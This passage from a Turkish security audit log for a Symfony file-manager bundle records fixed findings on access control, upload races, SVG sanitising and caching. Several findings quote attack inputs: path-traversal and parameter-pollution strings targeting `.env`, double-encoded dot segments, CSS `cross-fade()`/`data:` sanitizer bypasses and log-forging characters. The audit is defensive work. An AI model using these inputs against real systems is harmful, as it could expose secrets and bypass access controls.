  - **Düzeltme:** `ApiController::list()` önbellek temizliğini `assertAccessiblePath` + `assertGranted` sonrasına (`invalidateFallbackCaches()`) erteledi; `loadCachedRawTree()` `$forceRefresh` temizliğini kök `VIEW` yetkisine bağladı ve kök tarama hatalarını önbelleğe yazmadan yakaladı.

- [x] **P13-05 [YÜKSEK GÜVENLİK — CSRF/DND] `browser_controller.js` Çapraz Kaynak / Çapraz Örnek Sürükle-Bırak Sahteciliği**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** Dış bir sayfa `application/x-liveux-fm` veri tipiyle sürükle-bırak taşıma eylemi taklit edebiliyordu.
  - **Düzeltme:** `connect()` içinde benzersiz `dragInstanceToken` üretilip `onFolderDrop()` aşamasında doğrulandı.

- [x] **P13-06 [ORTA MANTIK & PERFORMANS] Image Editor Erken Kayıt (`300×150` Boş Tuval) & rAF Ayrımı + `closeModal()` Temizliği**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** `img.onload` tamamlanmadan kayıt butonları aktifti ve her `pointermove` olayında tam çözünürlüklü iki tuval baştan çiziliyordu; `closeModal()` modal DOM'unu boşaltmıyordu.
  - **Düzeltme:** `imageLoaded` bayrağı ve `workCanvas` `0×0` başlangıcı ile butonlar `img.onload`'a bağlandı; `rebuildWorkCanvas()` ve rAF kontrollü `renderCropOverlay()` ayrıldı; `closeModal()` rAF iptal edip `modalBodyTarget.innerHTML` temizledi.

- [x] **P13-07 [EŞZAMANLILIK — UPLOAD & NAVIGATION] Pause/Resume Çift İşçi Yarışı, `restoreLastVisitedLocation` İptal Geri Alma Hatası & Çöp Kutusu Kota/Cache Yenileme**
  - **Dosyalar:** `assets/controllers/browser_controller.js`, `src/Controller/ApiController.php`
  - **Bulgu:** Hızlı Pause → Resume iki paralel chunk işçisi başlatabiliyor, `restoreLastVisitedLocation()` `navigateTo()` iptal (`null`) döndüğünde `localStorage`'ı silip geri dönüyor, `purgeTrash`/`emptyTrash` kota ve `dirCache`'i güncellemiyordu.
  - **Düzeltme:** `runToken`, `activeWorkers` sayacı ve iptal edilebilir retry zamanlayıcısı eklendi; `restoreLastVisitedLocation` yalnızca kesin hata (`ok === false`) ve aktif oturumda geri alır; `ApiController::trash()` ve JS `fetchTrash()`/`purgeTrash()`/`emptyTrash()` kota ile `dirCache`'i senkronlar.

- [x] **P13-08 [GLOBAL UTF-8 PICKER] `FileManagerPickerType` >28 Karakter UTF-8 URL, `%23` ve `return_type: 'path'` Sertleştirmesi**
  - **Dosya:** `src/Form/FileManagerPickerType.php`
  - **Bulgu:** `%XX` URL-kodlu 29+ karakterlik CJK/Arapça/Hintçe dosya adları ham encoded byte uzunluğu >255 olduğu için ve `%23` (`#`) fragment sanıldığı için reddediliyordu; `return_type: 'path'` profil `assertAccessiblePath()` ve `visibleSkeleton` kontrolünden yoksundu.
  - **Düzeltme:** `parse_url(..., PHP_URL_PATH)` decode öncesinde alınarak `%XX` uzunluk şişmesi düzeltildi, kodlu `%23` kabul edilip `%3F` ve gizli `path` segmentleri engellendi; `isSafePickerValueForProfile()` profil kurallarını denetledi.

- [x] **P13-09 [TWIG EXTENSION URL GUARD] `FileManagerTwigExtension` Harici URL Segment & Query Yolu Koruması**
  - **Dosya:** `src/Twig/Extension/FileManagerTwigExtension.php`
  - **Bulgu:** Harici `https://.../.trash/...` veya `?path=../.env` sorgusu içeren adreslerde yol segmentleri temizlenmiyordu.
  - **Düzeltme:** Mutlak URL path bileşenleri ve tüm `?path=` sorgu parametreleri `hasDangerousRootRelativeSegments()` ile denetlendi.

- [x] **P13-10 [BİLGİ SIZINTISI & HTML YORUM BYPASS] `AutoInjectDialogHostSubscriber` Profil Seçimi ve Yorum Temizliği**
  - **Dosya:** `src/EventListener/AutoInjectDialogHostSubscriber.php`
  - **Bulgu:** Varsayılan profil reddedilip başka bir profil yetkilendirildiğinde yine yetkisiz `defaultProfile` `<div data-profile=...>` olarak enjekte ediliyordu; HTML yorumları (`<!-- ... -->`) içindeki picker öznitelikleri de enjeksiyon tetikleyebiliyordu.
  - **Düzeltme:** Yetkili ilk profil adı (`resolveAuthorizedProfileName()`) döndürüldü ve picker eşleştirmesi öncesinde HTML yorumları temizlendi.

- [x] **P13-11 [RBAC] `AssetEnrichmentService::assertEnrichGranted()` `EDIT_METADATA` & `MetadataSyncListener` (`skipVoter: false`)**
  - **Dosyalar:** `src/Service/AssetEnrichmentService.php`, `src/EventListener/MetadataSyncListener.php`
  - **Bulgu:** `MetadataSyncListener` yükleme sonrası zenginleştirmede `skipVoter: true` geçiyor ve `suggestMetadata()` `EDIT_METADATA` ile `metadata.enabled` izinlerini kontrol etmiyordu.
  - **Düzeltme:** `MetadataSyncListener` `skipVoter: false` yaptı; `assertEnrichGranted()` `metadata.enabled` ve `EDIT_METADATA` kontrolünü zorunlu kıldı.

- [x] **P13-12 [ARŞİV & METADATA SANİTİZASYONU] `RemoteUrlImporter` Uzantı Doğrulaması & `FileOperationsService` ZWNJ/Metadata Temizliği**
  - **Dosyalar:** `src/Service/RemoteUrlImporter.php`, `src/Service/FileOperationsService.php`
  - **Bulgu:** `resolveSafeExtractedCandidate()` katı `MimeTypes::getExtensions()` karşılaştırmasıyla `.docx`/`.csv`/`.svg` dosyalarını reddedebiliyordu; `updateFolderAppearance()`/`updateFolderMetadata()` `FolderMetadata::fromArray()` ile kenar ZWNJ temizliği yapmıyordu.
  - **Düzeltme:** Uzak ZIP çıkarım kontrolü `FileSecurityGuard::assertMimeMatchesExtension()`'a devredildi; klasör metadata kayıtları `FolderMetadata::fromArray()` üzerinden geçirildi.

- [x] **P13-13 [ORTA GÜVENLİK & BELLEK SINIRI] `ThumbnailController` Ön-Okuma Yetkisi & `Imagick` Kaynak Sınırları + Explicit Coder**
  - **Dosyalar:** `src/Controller/ThumbnailController.php`, `src/Service/ImageOptimizer.php`, `src/Thumbnail/Driver/ImagickThumbnailDriver.php`, `src/Controller/{Upload,ImageEditor,ZipDownload}Controller.php`
  - **Bulgu:** `ThumbnailController` sürücü kapalıyken dahi `readBoundedBinary()` ile 25 MB okuyabiliyordu; `Imagick` native RAM/zaman sınırı ve açık coder (`jpeg:`, `png:`, vb.) öneki eksikti; tüm hata JSON uçlarında `private, no-store` ve `nosniff` tutarsızdı.
  - **Düzeltme:** Ön-okuma `resolveDriver()` + `DOWNLOAD` kapısı, tüm JSON/413 yanıtlarda `private, no-store` + `nosniff`, `Imagick::setResourceLimit()` ve `jpeg:`/`png:`/`webp:`/`gif:`/`bmp:` zorlaması eklendi.

- [x] **P13-14 [VERİTABANI & ÖNBELLEK TUTARLILIĞI] `DoctrineDbalMetadataStorage`, `DirectoryCacheManager`, `CacheInvalidationListener` & `AuditLogListener`**
  - **Dosyalar:** `src/Bridge/Doctrine/DoctrineDbalMetadataStorage.php`, `src/Service/DirectoryCacheManager.php`, `src/EventListener/CacheInvalidationListener.php`, `src/EventListener/AuditLogListener.php`, `src/FileManagerBundle.php`
  - **Bulgu:** Boş metadata kaydı `itemCache` nedeniyle SQL `DELETE` atlayabiliyor, PostgreSQL `LEFT(canonical_key, 191)` indeksi `WHERE` ifadesiyle eşleşmiyor, `bumpGeneration()` ardışık `read+1` yarışına açıktı, `CacheInvalidationListener` tüm ata/üst-alt/S3 kökleri temizlemiyor ve `AuditLogListener` dosya adındaki `{ip}` ifadelerini PSR-3 yer tutucusu sanıyordu; açık DB bağlantısı hatalıysa `$defaultConnection` sessizce devralıyordu.
  - **Düzeltme:** Boş kayıtta koşulsuz SQL `DELETE`, PostgreSQL `LEFT(canonical_key, 191) LIKE :prefix191`, rastgele `'r...'` cache jenerasyon tokenları, kapsamlı ata/çapraz-volume önbellek temizliği, PSR-3 `{action} "{path}"` şablonu ve açık DB bağlantı izolasyonu eklendi.

- [x] **P13-15 [GLOBAL KLAVYE & ÇOK-DİLLİ RAKAMLAR] `AltGr` Koruması, Tam-Genişlik/Bengal/Tay Rakamları & Binlik Ayırıcılar**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** Türkçe/Alman/Lehçe klavyelerde `AltGr` (`Ctrl+Alt` + `AltGraph`) arama/navigasyon kısayollarını tetikliyordu; `parseLocalizedInt()` CJK `０-９`, Bengalce `০-৯`, Tayca `๐-๙` ve binlik ayırıcıları (`1,250`, `1.250`) tanıyamıyordu.
  - **Düzeltme:** `AltGraph` ve `ctrlKey && altKey` kombinasyonu `onKeydown()` başında elendi; `parseLocalizedInt()` 6 yazı sistemini ve gruplama ayırıcılarını normalleştirdi; sayfa atlama `<input>` değeri `{ useGrouping: false }` ile biçimlendirildi.

- [x] **P13-16 [WYSIWYG ADAPTÖR GÜVENLİĞİ] `ckeditor5_adapter.js`, `tinymce_adapter.js`, `tiptap_adapter.js` Yol Segmenti & Link Fallback**
  - **Dosyalar:** `assets/js/integrations/{ckeditor5,tinymce,tiptap}_adapter.js`
  - **Bulgu:** Editör adaptörleri URL yolundaki `.trash`, `..` ve gizli `.env` segmentlerini reddetmiyordu; CKEditor 5 `insertImage` komutu yokken görselleri eklemeden `inserted` listesine katıyordu.
  - **Düzeltme:** Üç adaptöre `hasDangerousPathSegments()` eklendi ve CKEditor 5 komutsız görselleri güvenli bağlantıya düşürdü.

---

## 15. 14. Tur (Pass-14) — 25.11.2026 — Canlı DI `ParseError` Kök Neden Çözümü, Pass-13 Tutarlılık Doğrulaması ve Hacker/Eşzamanlılık/Performans/Global Çok-Dilli Denetim

> **Denetçi Model & Versiyon:** `Google Antigravity — Gemini 4 (Extra High Reasoning)`
> **Yöntem:** (1) Canlı Twig render sırasında ortaya çıkan `syntax error, unexpected token ":", expecting ")"` (`Panel/Medya/DosyaYoneticisi/liveux_test.html.twig:134`) hatasının kök nedeninin tespiti ve Symfony DI derleme hattında kalıcı giderilmesi; (2) 13. turda yapılan tüm düzeltmelerin tutarlılık/regresyon denetimi (`T14-01..T14-12`); (3) tüm bundle katmanlarında (PHP DI/Controller/Security/Service/Storage/DBAL/CLI/AI + JS/Stimulus/WYSIWYG/Twig/CSS) hacker perspektifli güvenlik, eşzamanlılık, performans, erişilebilirlik ve global çok-dilli (CJK/Arapça/Farsça/İbranice/İndik/Tayca/Korece/RTL/IME) taraması (`P14-01..P14-20`).

### 15.1. Pass-13 Tutarlılık Doğrulaması ve Regresyon Düzeltmeleri (`T14-01` – `T14-12`)

- [x] **T14-01 [KRİTİK ÇALIŞMA ZAMANI ÇÖKMESİ] `DetectExternalVotersPass` & `config/services.php` — Derlenmiş `getDirectoryListerService.php` PHP `ParseError` (`$hasExternalVoters: true`) ve Decorator/Alias Kapsamı**
  - **Dosyalar:** `src/DependencyInjection/Compiler/DetectExternalVotersPass.php`, `config/services.php`, `tests/Unit/Security/TwelfthPassGlobalSecurityAuditTest.php`, `tests/Unit/Security/ThirteenthPassGlobalSecurityAuditTest.php`
  - **Bulgu:** 13. turda `DetectExternalVotersPass`, `PassConfig::TYPE_BEFORE_REMOVING` aşamasına taşındı; ancak Symfony'nin `ResolveNamedArgumentsPass` adımı daha erken olan `TYPE_BEFORE_OPTIMIZATION` aşamasında çalıştığı için `setArgument('$hasExternalVoters', ...)` çağrısı `$` önekli anahtarı ham biçimde bıraktı ve Symfony `PhpDumper` derlenmiş konteynerde geçersiz PHP sözdizimi (`$hasExternalVoters: true`) üreterek sayfa render'ında `ParseError` fırlattı. Ayrıca `DecoratorServicePass` sonrasında iç servis kimlikleri (`$definition->innerServiceId`), `container.decorator` etiketleri ve alias zincirleri atlanabiliyordu.
  - **Düzeltme:** `config/services.php` içine `DirectoryLister::class ->arg('$hasExternalVoters', true)` varsayılanı eklendi; `DetectExternalVotersPass` artık asla `$` önekli argüman anahtarı yazmaz — `0..5` konumsal argümanlar mevcutsa doğrudan konumsal indeks `6` (aksi halde `$` öneksiz `'hasExternalVoters'`) yazar ve varsa kalan `'$hasExternalVoters'` anahtarını siler. Ek olarak alias çözümlenmesi (`findDefinition()`) ile `innerServiceId` / `container.decorator` geçişi eklendi. `bin/console cache:clear --env=dev` sonrası üretilen `getDirectoryListerService.php` dosyası `php -l` ile doğrulandı (`No syntax errors detected`).

- [x] **T14-02 [YÜKSEK] `ThumbnailController` — `resolveDriver()` Yakalanmamış `FileManagerException` (`500` Yerine `503`) & `cache.enabled: false` İmmutable Başlık Çelişkisi**
  - **Dosya:** `src/Controller/ThumbnailController.php`
  - **Bulgu:** `thumbnail.on_missing_driver: 'exception'` yapılandırıldığında `resolveDriver()` tarafından fırlatılan `FileManagerException` yakalanmadan ham HTTP `500` döndürüyordu; ayrıca `cache.enabled: false` olduğunda dahi herkese açık SVG küçük resimleri `public, max-age=2592000, immutable` başlığı gönderiyordu.
  - **Düzeltme:** `resolveDriver()` `try/catch (FileManagerException)` ile sarılarak `503 Service Unavailable` + `Cache-Control: private, no-store` + `X-Content-Type-Options: nosniff` döndürüldü; `cache.enabled: false` iken `immutable` ve uzun `max-age` kapatılarak `no-cache` başlığı uygulandı.

- [x] **T14-03 [ORTA] `DoctrineDbalMetadataStorage` — PostgreSQL Çok-Baytlı UTF-8 Prefix (`substr` → `mb_substr`) & `text_pattern_ops` İndeks Sınıfı**
  - **Dosya:** `src/Bridge/Doctrine/DoctrineDbalMetadataStorage.php`
  - **Bulgu:** PostgreSQL `LEFT(canonical_key, 191)` fonksiyonu **karakter** sayısıyla çalışırken PHP tarafındaki `substr(..., 0, 191)` **bayt** sayısıyla kesme yapıyordu; bu nedenle CJK/Arapça/Türkçe uzun yollarda ön-filtre eşleşmeyebiliyordu. Ayrıca B-tree `LIKE 'prefix%'` sorguları `C` dışındaki locale'lerde `text_pattern_ops` olmadan indeksi kullanamıyordu.
  - **Düzeltme:** `mb_strlen`/`mb_substr(..., 'UTF-8')` kullanıldı ve PostgreSQL indeks tanımına `text_pattern_ops` sınıfı eklendi.

- [x] **T14-04 [PERFORMANS & MANTIK] `DirectoryLister` — Kesilmiş Bulut Ağacında `countDeepSubtreeVoterAware()` N+1 I/O Fırtınası, Paylaşımlı `500` Bütçe & `?int` `null` Yayılımı**
  - **Dosya:** `src/Service/DirectoryLister.php`
  - **Bulgu:** Ağaç derinliği veya düğüm sınırı nedeniyle kesilen bulut (S3/R2) dizinlerinde her klasör için bağımsız `countDeepSubtreeVoterAware()` çağrısı yapılması N+1 uzak I/O fırtınasına yol açabiliyordu; ayrıca bütçe aşıldığında dönen `null` değeri `0` ile toplanarak üst klasörlerde yanlış eksik sayılar gösterilebiliyordu.
  - **Düzeltme:** Uzak/kesilmiş ağaçta isteğe bağlı derin sayım paylaşımlı referans bütçesi (`&$countBudget = 500`) ile sınırlandırıldı; `buildFolderCountsFromRawNodes()` ve `countDeepSubtreeVoterAware()` boyunca bilinmeyen (`null`) sayımlar üst düğümlere `null` olarak yayıldı (yanlış `0`/eksik toplam gösterimi engellendi).

- [x] **T14-05 [YÜKSEK] `TrashManager` — Özel `metadata.file` Ayarında Çarpışma (`<stem>.trash-meta.json`), `.lock` + Atomik Rename & Çift I/O**
  - **Dosya:** `src/Service/TrashManager.php`
  - **Bulgu:** Özel `metadata.file` yolu verildiğinde çöp kutusu yerel yedek dosyası aynı dosya yoluna yazarak metadata JSON'ını bozabiliyordu; yazma işlemi eşzamanlı kilit/atomik yenileme içermiyor ve her okumada gereksiz `fileExists()` + `read()` çift çağrısı yapıyordu.
  - **Düzeltme:** Yerel fallback yolu daima ayrı `<stem>.trash-meta.json` kardeş dosyasına yönlendirildi; `.lock` dosya kilidi + geçici dosya yazıp atomik `rename` eklendi ve doğrudan `read()` ile çift depolama çağrısı kaldırıldı.

- [x] **T14-06 [ORTA] `ImageOptimizer` & `ImagickThumbnailDriver` — `RESOURCETYPE_AREA` Birim Hatası (Bayt) & `RESOURCETYPE_WIDTH`/`HEIGHT` Sınırları**
  - **Dosyalar:** `src/Service/ImageOptimizer.php`, `src/Thumbnail/Driver/ImagickThumbnailDriver.php`
  - **Bulgu:** ImageMagick `RESOURCETYPE_AREA` sınırı piksel değil **bayt** cinsinden değerlendirilir; önceki değer yüksek çözünürlüklü geçerli görselleri gereksiz kısıtlayabiliyor veya boyut sınırlarını (`WIDTH`/`HEIGHT`) açıkça koymuyordu.
  - **Düzeltme:** `RESOURCETYPE_AREA` `134_217_728` bayta (`128 MiB`) ayarlandı ve `RESOURCETYPE_WIDTH` / `RESOURCETYPE_HEIGHT` üst sınırları açıkça tanımlandı.

- [x] **T14-07 [ORTA] `CacheInvalidationListener` — Inline Volume Desteği, `?VolumeRegistry` Dinamik Token Çözümleme, `@ext_` Önek Çakışması & Arşiv Çıkarım Fırtınası**
  - **Dosya:** `src/EventListener/CacheInvalidationListener.php`
  - **Bulgu:** Yalnızca satır içi (`volumes: []`) yapılandırılmış profiller veya dinamik `{user_id}`/`{Y}` kökleri önbellek temizliğinde atlanabiliyordu; `@ext_` önek karşılaştırması hatalı eşleşebiliyor ve toplu arşiv çıkarımında (`fromArchiveExtraction`) her dosya için ayrı ağaç temizliği tetiklenebiliyordu.
  - **Düzeltme:** Opsiyonel `?VolumeRegistry` enjekte edilerek hem dinamik hem inline volume'ler çözümlendi (`VolumeConfig` `group:` / `driverOptions:` uyumlu), `@ext_` ayırıcısı sıkılaştırıldı ve `fromArchiveExtraction` olaylarında gereksiz dosya-başına ağaç temizliği engellendi.

- [x] **T14-08 [YÜKSEK] `browser_controller.js` — Parçalı Yükleme `Pause → Resume` `AbortError` Yarış Durumu (`job.runToken`)**
  - **Dosya:** `assets/controllers/browser_controller.js`
  - **Bulgu:** Parçalı yükleme duraklatılıp hemen devam ettirildiğinde, önceki worker'ın `abortController.abort()` kaynaklı gecikmiş `AbortError` hatası yeni başlayan worker'ı `error` durumuna düşürebiliyor veya `finally` bloğunda yeni worker'ın `abortController` referansını sıfırlayabiliyordu.
  - **Düzeltme:** Her worker turuna artan `job.runToken` ve yerel `const abortController` bağlandı; eski worker'ın hata/abort yolları `job.runToken !== runToken` kontrolüyle elendi, sunucu tarafından `200 OK` onaylanmış chunk'lar güvenle işlenip bırakıldı ve `finally` yalnızca kendi `abortController` referansını temizledi.

- [x] **T14-09 [YÜKSEK] `ckeditor5_adapter.js`, `tinymce_adapter.js`, `tiptap_adapter.js` & `picker_controller.js` — `new URL()` Öncesi Ham Path, 2 Geçişli Güvenli Decode & `?path=` / HPP / `path[]` Koruması**
  - **Dosyalar:** `assets/js/integrations/{ckeditor5,tinymce,tiptap}_adapter.js`, `assets/controllers/picker_controller.js`
  - **Bulgu:** `new URL('https://cdn.example.com/a/../secret.png')` çağrısı `..` segmentini sessizce katladığı için `..` denetimi aşılabiliyordu; ayrıca `?path=../.env`, çift kodlanmış `%252e%252e`, görünmez dolgu (`\u3164.trash`), `path[]` dizi anahtarları ve tekrarlı `path=` HPP vektörleri yakalanmıyordu. Öte yandan ham 2. geçiş `decodeURIComponent`, gerçek `50%off.png` (`50%25off.png`) dosya adlarında `URIError` fırlatabiliyordu.
  - **Düzeltme:** `new URL()` öncesinde ham yol ve sorgu ayrıştırıldı; 1. geçiş katı `decodeURIComponent`, 2. geçiş yalnızca geçerli `(?:%[0-9a-fA-F]{2})+` UTF-8 üçlülerini çözen `decodeValidTriplets` ile gerçek `50%off.png` desteklenirken `%252e%252e` ve `%25E3%2585%25A4.trash` engellendi; `path[...]` dizi anahtarları ve tekrarlı `path=` / `%70ath=` HPP girişimleri reddedildi.

- [x] **T14-10 [ORTA] `picker_controller.js` — Kabarcıklanan `live:connect` Çarpışması, `disabled` Senkronizasyonu, `isSafeRelativePath` İskelet/VS16 Eşitliği & RTL/Intl**
  - **Dosya:** `assets/controllers/picker_controller.js`
  - **Bulgu:** İç içe geçmiş bir çocuk LiveComponent'in kabarcıklanan `live:connect` olayı üst `liveComponent` referansını ezebiliyordu; `disabled` durum değişiklikleri UI'ya anında yansımıyor, `isSafeRelativePath` `con\uFE0F.png` ve kenar boşluklu segmentleri sunucuyla tam eşlemiyordu; dosya sayısı rakamları yerel `Intl.NumberFormat` kullanmıyordu.
  - **Düzeltme:** `event.target === this.liveRoot` kontrolü eklendi; `disabled` durumu senkronizasyon imzasına ve target hook'larına dahil edildi; `isSafeRelativePath` Windows ayrılmış ad/VS16/boşluk kontrolleri sunucuyla eşitlendi; dosya etiketinde `dir="ltr"` yalnızca dolu değerde açıldı ve `formatCount()` `Intl.NumberFormat` ile yerelleştirildi.

- [x] **T14-11 [ORTA] `DialogHost.html.twig` — PHP 8.4 Sayısal Olmayan `zIndex` Uyarısı**
  - **Dosya:** `templates/components/DialogHost.html.twig`
  - **Bulgu:** `zIndex` değerine güvenli olmayan/sayısal olmayan bir metin verildiğinde PHP 8.4 `A non-numeric value encountered` uyarısı üretiyordu (`DomAndCspSecurityTest` PHPUnit uyarısı).
  - **Düzeltme:** `'%d'|format(zIndex|default(1050)) + 0` ve pozitif alt sınır (`1050` varsayılanı) kullanılarak PHP 8.4 uyarıları tamamen (`0` uyarı) giderildi.

- [x] **T14-12 [ORTA] `Configuration` & `FileManagerBundle` — `defaults.locale: null` Otomatik Dil Algılaması & Host Uygulama Çeviri Keşfi**
  - **Dosyalar:** `src/DependencyInjection/Configuration.php`, `src/FileManagerBundle.php`
  - **Bulgu:** `defaults.locale` varsayılanının `'en'` olması, açıkça locale verilmediğinde Symfony istek/çevirmen dilinin otomatik devreye girmesini engelliyordu; ayrıca host uygulamanın `translations/` dizinindeki özel `LiveUXFileManagerBundle.<locale>.yaml` dosyaları taranmıyordu.
  - **Düzeltme:** `defaults.locale` `defaultNull()` yapıldı; `FileManagerBundle::prependExtension()` host uygulamanın `translator.default_path` ve `%kernel.project_dir%/translations` dizinlerindeki `LiveUXFileManagerBundle.*.*` kataloglarını otomatik keşfedecek şekilde genişletildi.

---

### 15.2. 14. Tur Yeni Güvenlik, Eşzamanlılık, Mantık, Performans, CLI, Arayüz ve Global Çok-Dilli Bulguları (`P14-01` – `P14-20`)

- [x] **P14-01 [KRİTİK] `SvgSanitizer` — CSS `cross-fade()` / `element()` / `data:` URL Bypass, W3C Satır Sonu String Kuralı & Öğe-Kapsamlı `href`/`data:image/*`**
  - **Dosya:** `src/Security/SvgSanitizer.php`
  - **Bulgu:** CSS `cross-fade(50% "https://...", red)` ve `element(#...)` / `data:` fonksiyonları `url()` denetimini aşabiliyordu; ayrıca `<a href="data:image/png;base64,...">` bağlantısı `<image>` ile aynı `data:image/*` izin kuralından geçerek tıklanabilir veri navigasyonuna izin veriyordu.
  - **Düzeltme:** `cross-fade(`, `element(` ve CSS içi `data:` şemaları engellendi; W3C CSS Syntax kuralına göre kaçışsız satır sonunda kırılan stringler lexer'da doğru sonlandırıldı; `data:image/*` yalnızca `<image>` öğelerinde izinli kılınarak `<a>` ve diğer etiketlerde reddedildi.

- [x] **P14-02 [YÜKSEK] `FileSecurityGuard`, `UploadManager` & `ZipArchiveService` — HFS+ Sıfır Genişlikli `exclude_patterns` Bypass & ReDoS-Korumalı `looksLikeSvgDocument()`**
  - **Dosyalar:** `src/Security/FileSecurityGuard.php`, `src/Service/UploadManager.php`, `src/Service/ZipArchiveService.php`
  - **Bulgu:** `_th\u{200B}umbs/cache.jpg` gibi görünmez/sıfır genişlikli karakterler içeren segmentler `exclude_patterns` regex'lerini aşabiliyordu; SVG içerik tespiti karmaşık regex yerine ReDoS riski taşımayan sınırlı bir kontrolle merkezileştirilmemişti.
  - **Düzeltme:** `exclude_patterns` denetimi hem ham hem `visibleSkeleton` katlanmış segment üzerinde çalıştırıldı; `FileSecurityGuard::looksLikeSvgDocument()` tek merkezde ReDoS-güvenli biçimde yazıldı ve `UploadManager` ile `ZipArchiveService` buraya bağlandı.

- [x] **P14-03 [YÜKSEK] `FileManagerAuthorizer` & Servisler — Ata Klasör Yetki Reddi (`isPathAndAncestorsGranted()`), `assertParentFolderCreatable()` & Çapraz-Volume Kopyalama `UPLOAD` İzni**
  - **Dosyalar:** `src/Security/FileManagerAuthorizer.php`, `src/Service/FileOperationsService.php`, `src/Service/UploadManager.php`, `src/Service/ZipArchiveService.php`, `src/Controller/ImageEditorController.php`, `src/Service/StorageQuotaChecker.php`
  - **Bulgu:** Path-scoped bir Voter `projects/secret` klasörünü reddettiğinde, alt dosya yolunun (`projects/secret/plan.pdf`) doğrudan istenmesi veya `createFolder('new_top/sub', 'leaf')` ile yetkisiz üst dizinlerin özyinelemeli oluşturulması engellenmeyebiliyordu; çapraz-volume `copyDirectory()` hedef volume için `UPLOAD` iznini doğrulamıyordu.
  - **Düzeltme:** `FileManagerAuthorizer::isPathAndAncestorsGranted()` eklenerek yükleme, ZIP çıkarım, görsel düzenleyici kopya kontrolü, klasör kopyalama ve kota dökümünde tüm ata segmentler doğrulandı; `FileOperationsService::assertParentFolderCreatable()` ve çapraz-volume `copyDirectory()` `UPLOAD` kapısı eklendi.

- [x] **P14-04 [YÜKSEK] `UploadManager` & `RemoteUrlImporter` — Anonim Parçalı Yükleme İzolasyonu, `.chunk.lock` Kilidi, `$cleanDir` Bağlama & Ön-İndirme Yetki Kapısı**
  - **Dosyalar:** `src/Service/UploadManager.php`, `src/Service/RemoteUrlImporter.php`
  - **Bulgu:** Oturumsuz ortamlarda parçalı yükleme geçici klasörleri kullanıcı/oturum kapsamından yoksundu, eşzamanlı parça yazımları kilitsiz yarışabiliyordu, `resolveChunkDir()` hedef `$cleanDir` yoluna bağlı değildi ve `RemoteUrlImporter` uzak dosyayı indirmeden önce hedef dizin/profil yazma kapılarını (`assertCanImportInto`) doğrulamıyordu.
  - **Düzeltme:** Opsiyonel `?RequestStack` ile anonim parça kapsamı izole edildi, parça yazımına `.chunk.lock` kilidi eklendi, `resolveChunkDir($profile, $volumeName, $cleanDir, $safeId)` hedef dizine bağlandı (hem `handleChunkedUpload` hem `abortChunkedUpload`), ve `RemoteUrlImporter` indirme başlatmadan önce `uploadManager->assertCanImportInto()` çağrısı yaptı.

- [x] **P14-05 [YÜKSEK] `FileManagerTwigExtension` & `FileManagerPickerType` — HPP Çift `path=`, `%70ath=`, Dizi `path[]=`, Tam-Genişlikli Eğik Çizgi (`／`) & Profil Bazlı URL Koruması**
  - **Dosyalar:** `src/Twig/Extension/FileManagerTwigExtension.php`, `src/Form/FileManagerPickerType.php`
  - **Bulgu:** `?path=../../.env&path=safe.png` (HPP), `?%70ath=../../.env`, `?path[]=1` dizi anahtarları, tam-genişlikli `／` (`U+FF0F`) bölü işareti ve `return_type: 'url'` modunda profilin özel çöp kutusu / `exclude_patterns` yolları (`recycle_bin/`, `_thumbs/`) aşılabiliyordu.
  - **Düzeltme:** Her iki sınıfta ham sorgu ayrıştırıcısı (`extractRawQueryPathValues` / `extractQueryPathParams`) `path[...]` dizi sözdizimini anında `null` ile reddedecek, çift `path=` / `%70ath=` HPP girişimlerini bloke edecek, `／`/`∕`/`⁄`/`＼` karakterlerini reddedecek ve `FileManagerPickerType` profil URL yollarını `assertAccessiblePath()` ile doğrulayacak şekilde sertleştirildi.

- [x] **P14-06 [YÜKSEK] `AutoInjectDialogHostSubscriber` — Raw-Text HTML Eleman İçi Sahte Picker Tespiti & Public Cache Koruması**
  - **Dosya:** `src/EventListener/AutoInjectDialogHostSubscriber.php`
  - **Bulgu:** `<textarea>`, `<script>`, `<style>` veya `<template>` blokları içinde metin olarak geçen `data-controller="liveux--file-manager-bundle--picker"` ifadesi, yetkisiz sayfalara dahi `DialogHost` enjeksiyonu tetikleyebiliyordu; `permissions.view !== true` profillerde genel önbelleklenebilir yanıtlara enjeksiyon riski vardı.
  - **Düzeltme:** Picker tespiti öncesi `<script>`, `<style>`, `<textarea>`, `<template>` blokları fail-closed olarak temizlendi ve `view !== true` durumlarında public-cache yanıt koruması eklendi.

- [x] **P14-07 [ORTA] `AuditLogListener` — Log Enjeksiyonu, BiDi Override (`U+202E`) & Geçersiz UTF-8 Temizliği**
  - **Dosya:** `src/EventListener/AuditLogListener.php`
  - **Bulgu:** Dosya yolları, kullanıcı adları veya `$extra` alanları (`targetPath` vb.) içindeki `\r`/`\n`, BiDi yön değiştirme karakterleri (`U+202E`) ve bozuk UTF-8 baytları denetim günlüklerine ham geçerek log sahteciliğine (log forging) yol açabiliyordu.
  - **Düzeltme:** Tüm denetim bağlam alanları `mb_scrub(..., 'UTF-8')` ve kontrol/BiDi karakter temizliğinden geçirildi.

- [x] **P14-08 [ORTA] `ApiController` — Erken Hata Yanıtlarında `privateJsonResponse()` Tutarlılığı**
  - **Dosya:** `src/Controller/ApiController.php`
  - **Bulgu:** Bozuk JSON gövdesi veya erken doğrulama hatalarında dönen yanıtlar `Cache-Control: private, no-store` ve `X-Content-Type-Options: nosniff` başlıklarını taşımayabiliyordu.
  - **Düzeltme:** Tüm erken hata yolları `privateJsonResponse()` yardımcısına birleştirildi.

- [x] **P14-09 [ORTA] `ShareController` — `allow_pdf_preview` / `allow_video_preview`, `Content-Length`, HTTP `Range` (`206`) & Olmayan Yerel Dizin Koruması**
  - **Dosya:** `src/Controller/ShareController.php`
  - **Bulgu:** İmzalı paylaşım bağlantısı profilin `ui.allow_pdf_preview: false` / `ui.allow_video_preview: false` ayarlarını göz ardı edip satır içi (`inline`) gösterebiliyor, video/PDF tarayıcı akışı için `Range` (`206 Partial Content`) / `Content-Length` başlıklarını eksik bırakabiliyor ve var olmayan yerel klasörde yan etkiyle `mkdir` oluşturabiliyordu.
  - **Düzeltme:** `allow_pdf_preview` / `allow_video_preview` satır içi önizleme kararına bağlandı, HTTP `Range` (`206`) + `Content-Range` + `Content-Length` desteği eklendi ve olmayan yerel dizinlerde klasör oluşturma atlandı.

- [x] **P14-10 [YÜKSEK] `JsonFileMetadataStorage` — Bozuk/Okunamayan Metadata JSON Dosyasında Fail-Closed Koruması**
